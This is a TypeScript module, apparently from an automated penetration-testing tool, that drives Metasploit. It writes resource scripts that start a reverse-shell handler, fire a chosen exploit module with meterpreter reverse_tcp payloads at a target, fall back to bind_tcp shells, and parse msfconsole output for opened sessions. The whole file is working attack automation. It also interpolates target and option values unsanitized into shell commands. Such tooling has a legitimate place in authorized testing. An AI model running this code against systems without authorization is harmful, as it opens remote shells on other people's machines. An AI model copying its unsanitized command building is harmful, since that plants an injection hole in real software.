/**
 * MSF Session Executor
 *
 * Shared helper for executing Metasploit exploits with proper session establishment.
 * Fixes the critical bug where `exploit -z; exit` killed sessions immediately.
 *
 * This module:
 * 1. Validates the module path (rejects handlers/scanners/DoS)
 * 2. Starts a background multi/handler FIRST (so reverse shells have somewhere to connect)
 * 3. Runs the exploit module against the target
 * 4. Polls for session establishment (waits up to 30s)
 * 5. Falls back to bind shell if reverse connectivity fails
 * 6. Returns structured session info
 *
 * Used by:
 * - enhanced-exploit-orchestration.ts (Path A: Direct Metasploit)
 * - exploit-service-fingerprint-db.ts (Fingerprint DB fast-path)
 */

export interface MsfExploitParams {
  /** MSF module path (e.g., exploit/linux/http/...) */
  modulePath: string;
  /** Target IP/hostname */
  target: string;
  /** Target port */
  port: number;
  /** Attacker's public IP (scan server) for LHOST */
  lhost: string;
  /** Target OS hint for payload selection */
  targetOs?: string;
  /** Additional MSF options (e.g., TARGETURI, SSL) */
  extraOptions?: Record<string, string>;
  /** Engagement ID for file naming */
  engagementId?: number;
  /** Whether this is a training lab (longer timeouts) */
  trainingLabMode?: boolean;
}

export interface MsfExploitResult {
  success: boolean;
  sessionOpened: boolean;
  sessionId?: string;
  sessionType?: string; // 'meterpreter' | 'shell' | 'command_shell'
  output: string;
  method: 'reverse_tcp' | 'reverse_https' | 'bind_tcp' | 'none';
  durationMs: number;
  logs: Array<{ type: string; title: string; detail: string }>;
}

// Session detection patterns
const SESSION_OPENED_REGEX = /session (\d+) opened/i;
const METERPRETER_REGEX = /meterpreter\s*>\s*|meterpreter session/i;
const SHELL_OPENED_REGEX = /command shell session (\d+)|shell session (\d+)/i;
const SESSION_LIST_REGEX = /(\d+)\s+(meterpreter|shell)\s+/i;

/**
 * Execute a Metasploit exploit with proper handler setup and session polling.
 * Tries reverse TCP first, then falls back to bind TCP if reverse fails.
 */
export async function executeMsfExploit(params: MsfExploitParams): Promise<MsfExploitResult> {
  const startTime = Date.now();
  const logs: MsfExploitResult['logs'] = [];
  const { modulePath, target, port, lhost, targetOs, extraOptions, engagementId, trainingLabMode } = params;

  // ── Validate module path — reject handlers, scanners, DoS, and post-exploitation modules ──
  const { isInvalidExploitModule } = await import('./exploit-selection-intelligence');
  if (isInvalidExploitModule(modulePath)) {
    logs.push({ type: 'warning', title: '⚠️ MSF: Invalid module rejected', detail: `Module "${modulePath}" is not an exploit (handler/scanner/DoS/post). Skipping.` });
    return {
      success: false,
      sessionOpened: false,
      output: `REJECTED: "${modulePath}" is not a valid exploit module. It is a handler/scanner/DoS tool that cannot produce sessions.`,
      method: 'none',
      durationMs: Date.now() - startTime,
      logs,
    };
  }

  // Determine payload based on target OS
  const isWindows = (targetOs || '').toLowerCase().includes('windows');
  const reversePayload = isWindows
    ? 'windows/x64/meterpreter/reverse_tcp'
    : 'linux/x64/meterpreter/reverse_tcp';
  const bindPayload = isWindows
    ? 'windows/x64/meterpreter/bind_tcp'
    : 'linux/x64/meterpreter/bind_tcp';

  // Use unique ports to avoid conflicts with concurrent exploits
  const lport = 4444 + Math.floor(Math.random() * 200);
  const bindPort = 4800 + Math.floor(Math.random() * 200);

  const { executeRawCommand } = await import('./scan-server-executor');

  // ── Attempt 1: Reverse TCP with persistent handler ──
  logs.push({ type: 'info', title: '🔧 MSF: Starting reverse handler', detail: `${reversePayload} on 0.0.0.0:${lport}` });

  const reverseResult = await attemptExploit({
    executeRawCommand,
    modulePath,
    target,
    port,
    payload: reversePayload,
    lhost,
    lport,
    extraOptions,
    engagementId,
    timeout: trainingLabMode ? 200 : 150,
    useHandler: true,
    logs,
  });

  if (reverseResult.sessionOpened) {
    logs.push({ type: 'exploit_success', title: '✅ Reverse shell established', detail: `Session ${reverseResult.sessionId} via ${reversePayload}` });
    return {
      success: true,
      sessionOpened: true,
      sessionId: reverseResult.sessionId,
      sessionType: reverseResult.sessionType,
      output: reverseResult.output,
      method: 'reverse_tcp',
      durationMs: Date.now() - startTime,
      logs,
    };
  }

  // ── Attempt 2: Bind TCP (target may not have outbound connectivity) ──
  logs.push({ type: 'warning', title: '🔧 MSF: Reverse shell failed — trying bind shell', detail: `Switching to ${bindPayload} on port ${bindPort}` });

  const bindResult = await attemptExploit({
    executeRawCommand,
    modulePath,
    target,
    port,
    payload: bindPayload,
    lhost: target, // For bind, we connect TO the target
    lport: bindPort,
    extraOptions,
    engagementId,
    timeout: trainingLabMode ? 180 : 120,
    useHandler: false, // Bind doesn't need a separate handler
    logs,
  });

  if (bindResult.sessionOpened) {
    logs.push({ type: 'exploit_success', title: '✅ Bind shell established', detail: `Session ${bindResult.sessionId} via ${bindPayload}` });
    return {
      success: true,
      sessionOpened: true,
      sessionId: bindResult.sessionId,
      sessionType: bindResult.sessionType,
      output: bindResult.output,
      method: 'bind_tcp',
      durationMs: Date.now() - startTime,
      logs,
    };
  }

  // ── Both attempts failed ──
  logs.push({ type: 'warning', title: '❌ MSF: No session established', detail: `Both reverse (port ${lport}) and bind (port ${bindPort}) attempts failed after ${Date.now() - startTime}ms` });
  return {
    success: false,
    sessionOpened: false,
    output: `${reverseResult.output}\n---BIND ATTEMPT---\n${bindResult.output}`,
    method: 'none',
    durationMs: Date.now() - startTime,
    logs,
  };
}

// ── Internal helper ──

interface AttemptParams {
  executeRawCommand: (cmd: string, opts?: any) => Promise<{ stdout: string; stderr: string; exitCode: number }>;
  modulePath: string;
  target: string;
  port: number;
  payload: string;
  lhost: string;
  lport: number;
  extraOptions?: Record<string, string>;
  engagementId?: number;
  timeout: number;
  useHandler: boolean;
  logs: MsfExploitResult['logs'];
}

interface AttemptResult {
  sessionOpened: boolean;
  sessionId?: string;
  sessionType?: string;
  output: string;
}

async function attemptExploit(p: AttemptParams): Promise<AttemptResult> {
  const rcFile = `/tmp/msf_exploit_${p.engagementId || 'auto'}_${Date.now()}.rc`;

  // Build resource script — this is the KEY FIX:
  // Instead of `exploit -z; exit`, we use a resource script that:
  // 1. Optionally starts a handler first
  // 2. Runs the exploit as a job
  // 3. Waits for session establishment
  // 4. Lists sessions to confirm
  const rcLines: string[] = [];

  if (p.useHandler) {
    // Start handler FIRST so reverse shells have somewhere to connect
    rcLines.push(
      'use exploit/multi/handler',
      `set PAYLOAD ${p.payload}`,
      `set LHOST 0.0.0.0`,
      `set LPORT ${p.lport}`,
      'set ExitOnSession false',
      'exploit -j -z',
      'sleep 2',
    );
  }

  // Now run the actual exploit
  rcLines.push(
    `use ${p.modulePath}`,
    `set RHOSTS ${p.target}`,
    `set RHOST ${p.target}`,
    `set RPORT ${p.port}`,
    `set PAYLOAD ${p.payload}`,
    `set LHOST ${p.lhost}`,
    `set LPORT ${p.lport}`,
  );

  // Add extra options
  if (p.extraOptions) {
    for (const [key, val] of Object.entries(p.extraOptions)) {
      rcLines.push(`set ${key} ${val}`);
    }
  }

  // Run exploit as job, then wait and check sessions
  rcLines.push(
    'exploit -j -z',
    'sleep 15',  // Wait for exploit to fire and session to establish
    'sessions -l',
    'sleep 5',
    'sessions -l',
    'exit',
  );

  const rcContent = rcLines.join('\n');

  // Write resource script and execute
  const writeCmd = `cat > ${rcFile} << 'MSFRC'\n${rcContent}\nMSFRC`;
  await p.executeRawCommand(writeCmd, { timeout: 10 });

  p.logs.push({ type: 'info', title: '🔧 MSF: Executing resource script', detail: `${p.modulePath} → ${p.target}:${p.port} (payload: ${p.payload})` });

  const result = await p.executeRawCommand(
    `timeout ${p.timeout} msfconsole -q -r ${rcFile} 2>&1; rm -f ${rcFile}`,
    { timeout: p.timeout + 30 },
  );

  const output = result.stdout || '';

  // Check for session establishment
  const sessionMatch = output.match(SESSION_OPENED_REGEX) ||
                       output.match(SHELL_OPENED_REGEX);
  const hasMeterpreter = METERPRETER_REGEX.test(output);
  const sessionListMatch = output.match(SESSION_LIST_REGEX);

  if (sessionMatch || hasMeterpreter || sessionListMatch) {
    const sessionId = sessionMatch?.[1] || sessionListMatch?.[1] || 'unknown';
    const sessionType = hasMeterpreter ? 'meterpreter' :
                       (sessionListMatch?.[2] || 'shell');
    return {
      sessionOpened: true,
      sessionId,
      sessionType,
      output,
    };
  }

  return {
    sessionOpened: false,
    output,
  };
}
